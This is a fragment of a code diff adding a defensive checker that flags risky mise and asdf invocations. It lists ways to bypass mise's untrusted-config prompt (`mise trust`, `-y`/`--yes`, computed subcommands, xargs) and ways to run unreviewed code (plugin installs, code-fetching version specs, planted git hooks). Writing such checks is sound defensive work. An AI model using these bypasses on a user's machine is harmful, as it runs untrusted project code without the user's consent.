+            continue
+        if not args:
+            sub_pos = j
+        args.append(w)
+        j += 1
+        if len(args) >= 64:
+            return "mise invocation too long to judge"  # fails closed (QA round 3)
+    # `--yes`/`-y` auto-answers mise's "config is not trusted. Trust
+    # it?" prompt -- the same trust bypass as `mise trust` (QA round 1).
+    opts = rest[:rest.index("--")] if "--" in rest else rest
+    a0 = args[0].lower() if args else ""
+    if a0 in ("exec", "x"):
+        # Everything before `--` is mise's own (tool specs, -E/-C values,
+        # `-c CMD`) -- a `-y` anywhere there is the global flag (QA round 5).
+        pass
+    elif a0 in ("run", "r", "watch", "w", "tasks", "task", "t"):
+        # `mise run test -y`: a `-y` after the task name belongs to the
+        # task, but `mise run -y test` / `mise run -E dev --yes test` /
+        # `mise tasks run -y test` is mise's own global flag (QA rounds
+        # 4-5): options (with their values) up to the first task name.
+        k = sub_pos                 # real position, not `.index()` (QA round 6)
+        opts = rest[:k]
+        tail_ = rest[k + 1:]
+        if a0 in ("tasks", "task", "t"):
+            q0 = 0
+            while q0 < len(tail_) and tail_[q0].startswith("-"):
+                opts.append(tail_[q0])
+                q0 += 2 if tail_[q0] in _MISE_VALUE_OPTS else 1
+            if q0 < len(tail_) and tail_[q0].lower() in ("run", "r"):
+                tail_ = tail_[q0 + 1:]
+            else:
+                tail_ = []
+        q = 0
+        while q < len(tail_):
+            o = tail_[q]
+            if o == "--" or not o.startswith("-"):
+                break
+            opts.append(o)
+            q += 2 if o in _MISE_VALUE_OPTS or o in _MISE_RUN_VALUE_OPTS else 1
+    if any(o == "--yes" or o.startswith("--yes=")
+           or re.fullmatch(r"-[A-Za-z]*y[A-Za-z]*", o) for o in opts):
+        return "mise --yes/-y (auto-accepts mise's untrusted-config prompt)"
+    if not args:
+        if binname in ("mise", "rtx") and any(
+                w.rsplit("/", 1)[-1].lower() in ("xargs", "parallel") for w in words[:i]):
+            return "mise run with arguments from stdin (xargs)"
+        return ""
+    sub = args[0].lower()
+    tail = args[1:]
+    # A computed subcommand (`mise $(echo trust)`, `mise ${X:-trust}`,
+    # `mise {trust,}`, `xargs -I{} mise {}`) is unknown -- ask (QA round 3).
+    if any(c in sub for c in "$`*?[") or sub == "{}" or ("{" in sub and "," in sub):
+        return "mise with a computed subcommand"
+    if binname in ("mise", "rtx") and sub == "asdf":
+        # `mise asdf <args>` forwards to the mise CLI (QA round 3).
+        return _mise_judge_invocation([binname] + tail, 0)
+    tl = [t.lower() for t in tail]
+    if binname == "asdf":
+        if sub in ("set", "local", "global", "shell") and any(
+                t.lower().startswith(("path:", "ref:http")) for t in tail):
+            return f"asdf {sub} with a path:/ref: version"
+        if sub in ("plugin-add", "plugin-update") or (
+                sub == "plugin" and tl[:1] and tl[0] in ("add", "update")):
+            return "asdf plugin install/update (runs the plugin's scripts on every shim call)"
+        return ""
+    if sub == "trust":
+        flags = {t for t in tl if t.startswith("-")}
+        if flags & {"--untrust", "--show", "--ignore"}:
+            return ""
+        return "mise trust (silences mise's own untrusted-config check)"
+    if sub in ("settings", "setting"):
+        if not tl:
+            return ""
+        op = tl[0]
+        if op in ("ls", "list", "get"):
+            return ""
+        if op in ("unset", "rm"):
+            # Removing a human-set safety switch (`paranoid`) weakens
+            # mise as much as setting it false (QA round 1).
+            if all(k.lower() in _MISE_SETTINGS_SAFE
+                   or k.lower() in _MISE_SETTINGS_SAFE_NESTED
+                   for k in tail[1:] if not k.startswith("-")):
+                return ""
+            return f"mise settings {op} (removes a setting)"
+        kv = tail[1:] if op in ("set", "add") else tail
+        key = ""
+        if kv:
+            m = _MISE_SETTINGS_KV_RE.match(kv[0])
+            key = (m.group(1) if m else kv[0]).lower()
+            val = (m.group(2) if m else (kv[1] if len(kv) > 1 else "")).lower()
+            if key in _MISE_SETTINGS_SAFE or key in _MISE_SETTINGS_SAFE_NESTED:
+                return ""
+            if key in _MISE_SETTINGS_SAFE_IF_TRUE and val in ("true", "1", "yes"):
+                return ""
+        return f"mise settings change ({key or op})"
+    if sub in ("shell-alias", "shell_alias"):
+        if tl[:1] and tl[0] in ("set", "add"):
+            return "mise shell-alias set (defines a shell alias run on activation)"
+        return ""
+    if sub in ("config", "cfg", "toml"):
+        if tl[:1] and tl[0] in ("set",):
+            return "mise config set (rewrites a mise.toml key)"
+        return ""
+    if sub == "set":
+        for t in tail:
+            if t.startswith("-"):
+                continue
+            name, eq, val = t.partition("=")
+            if eq and (mise_env_name_dangerous(name)
+                       or _MISE_TEMPLATE_EXEC_RE.search(val)):
+                return f"mise set {name} (exported into every later shell/command)"
+        return ""
+    if sub in ("link", "ln"):
+        return "mise link (points an installed tool version at an arbitrary directory)"
+    if sub == "sync":
+        return "mise sync (imports tool installs from nvm/pyenv/... dirs)"
+    if sub in ("use", "u", "local", "global", "shell", "sh"):
+        if any(_mise_spec_unsafe(t) for t in tail):
+            return "mise use of a code-fetching backend / path: version (persisted to mise.toml)"
+        return ""
+    if sub in ("plugins", "plugin", "p"):
+        if tl[:1] and tl[0] in ("install", "i", "add", "a", "link", "ln",
+                                "update", "up", "upgrade"):
+            return "mise plugin install/link (runs the plugin's scripts)"
+        return ""
+    if sub in ("tool-alias", "alias", "a"):
+        if tl[:1] and tl[0] in ("set", "add", "create"):
+            return "mise tool-alias set (remaps a tool name to another backend)"
+        return ""
+    if sub in ("generate", "gen", "g"):
+        if tl[:1] and tl[0] in ("git-pre-commit", "pre-commit") and (
+                {"--write", "-w"} & set(tl)):
+            return "mise generate git-pre-commit --write (plants a git hook)"
+        return ""
+    return ""
